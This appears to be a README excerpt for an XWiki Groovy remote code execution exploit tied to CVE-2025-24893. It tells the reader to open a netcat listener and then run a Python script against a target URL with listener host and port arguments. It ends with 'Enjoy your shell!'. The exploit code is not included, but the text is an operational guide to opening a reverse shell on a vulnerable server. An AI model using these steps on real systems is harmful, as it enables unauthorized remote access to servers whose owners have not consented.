### How launch each tool
#### XWiki Groovy RCE exploit with reverse shell prep
>For python tools I highly recommend getting [uv](https://github.com/astral-sh/uv) as it is going to make your life easier in terms for launching any python code 

**Prepare your listiner you can use [revshells](https://www.revshells.com/)**
```shell
nc -lvnp <LPORT>
```
> I tried with meterpreter listiner but it didin't work you can create PR if you find a fix

**Launch the script**
```shell
uv run cve-2025-24893-rs.py http://target:(port) LHOST LPORT
```

Enjoy your shell!